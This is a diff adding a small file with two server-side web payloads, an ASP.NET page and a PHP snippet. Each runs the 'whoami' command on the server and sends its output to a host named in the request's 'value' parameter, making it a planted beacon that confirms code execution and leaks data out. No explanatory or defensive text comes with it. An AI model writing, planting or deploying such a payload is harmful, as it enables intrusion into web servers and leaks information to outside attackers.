@@ -1,0 +1,31 @@
+<%@ Page Language="C#" %>
+<%
+if (Request.QueryString["value"] != null)
+{
+    string host = Request.QueryString["value"];
+    string user = "";
+    using (System.Diagnostics.Process p = new System.Diagnostics.Process())
+    {
+        p.StartInfo.FileName = "whoami";              // Command to execute
+        p.StartInfo.RedirectStandardOutput = true;    // Capture output
+        p.StartInfo.UseShellExecute = false;          // Required for output redirection
+        p.Start();
+        user = p.StandardOutput.ReadToEnd().Trim();   // Read and trim output
+    }
+    using (System.Net.WebClient client = new System.Net.WebClient())
+    {
+        string url = "http://" + host + "/?user=" + Uri.EscapeDataString(user); // Build URL
+        client.DownloadString(url);                   // Send GET request
+    }
+}
+%>
+
+
+<?php
+if (isset($_GET['value'])) {
+    $host = $_GET['value'];
+    $user = trim(shell_exec('whoami')); // Execute 'whoami' and remove trailing newline
+    $url = "http://$host/?user=" . urlencode($user); // Encode output for URL safety
+    file_get_contents($url); // Make the GET request
+}
+?>
